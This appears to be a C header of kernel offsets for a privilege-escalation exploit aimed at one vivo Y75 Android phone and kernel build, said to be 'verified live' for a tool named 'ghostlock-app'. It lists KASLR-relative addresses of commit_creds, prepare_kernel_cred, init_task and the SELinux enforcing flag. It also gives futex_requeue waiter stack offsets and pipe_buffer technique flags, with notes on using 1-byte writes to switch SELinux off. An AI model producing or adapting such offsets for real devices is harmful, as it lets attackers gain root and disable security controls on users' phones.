/* offsets.h — vivo Y75 V2117 MT6781 4.14.186-gdfd963175-dirty PD2150F_EX_A_38.21.2
 * Generated from y75_clean/targets/target_y75.h (2026-09-10) + live KASLR 0xffffff858c000000
 * Derived originally from vivo 38.17.2 boot.img g6de895749 vmlinux_new.elf 106k kallsyms,
 * verified live on 38.21.2 gdfd963175 with 6/6 pipe 12/12 reclaim (futex_requeue sp+0x78).
 * KIMAGE base 0xffffff8008080000 (_text), VA_BITS 39, page 4096.
 * Notes:
 *   - BTF not found is expected on 4.14
 *   - No futex_wait_requeue_pi symbol — opcode 11 lives in futex_requeue frame 0x140
 *     x29=sp+0xe0 waiter x29-0x68 = sp+0x78 lock sp+0xb0 compact 0x50
 *   - No pselect 320 256B stack_fds — sys_pselect6 0xa0 on 4.14, use pipe_buffer 4K
 *   - selinux_state is packed: enforcing 1 byte + initialized 1 byte + policycap — must use 1-byte writes
 * Provenance: y75_clean/tools_out/waiter_map.py + logs/extract_target.log + live perf_leak_y75
 */
#pragma once
// Exact match required by ghostlock-app: uname -r "4.14.186-gdfd963175-dirty"
#define KERNEL_RELEASE "4.14.186-gdfd963175-dirty"
#define DEVICE_NAME    "vivo Y75 V2117 MT6781"
#define KIMAGE_TEXT_BASE_STATIC 0xffffff8008080000ULL
#define PAGE_SIZE      4096ULL
#define VA_BITS        39

// Image-relative (add live KASLR base) — fixed from g6de header 0x01994b08->0x01914b08 etc.
#define OFF_SEL_SELINUX_ENFORCING 0x01914b08ULL  // selinux_state D 0x9994b08
#define OFF_INIT_TASK             0x02390000ULL  // init_thread_union D 0xa410000
#define OFF_KIMAGE_BASE           0xffffff8008080000ULL
#define OFF_COMMIT_CREDS          0x000e6170ULL
#define OFF_PREPARE_KERNEL_CRED   0x000e6508ULL
#define OFF_RB_ERASE_CACHED       0x01263580ULL
#define OFF_ANON_PIPE_BUF_OPS     0x01235d00ULL

// 4.14-specific waiter layout
#define FUTEX_REQUEUE_SP_WAITer   0x78
#define FUTEX_REQUEUE_SP_LOCK     0xb0
#define FUTEX_REQUEUE_FRAME       0x140
#define WAITER_SIZE_COMPACT       0x50

// Fork routing hint
#define USE_PIPE_BUFFER 1   // set; msg_msg filtered (msgget ENOSYS) on stock V2117
#define PSELECT_INFEASIBLE 1 // per waiter_verdict_4.14.txt
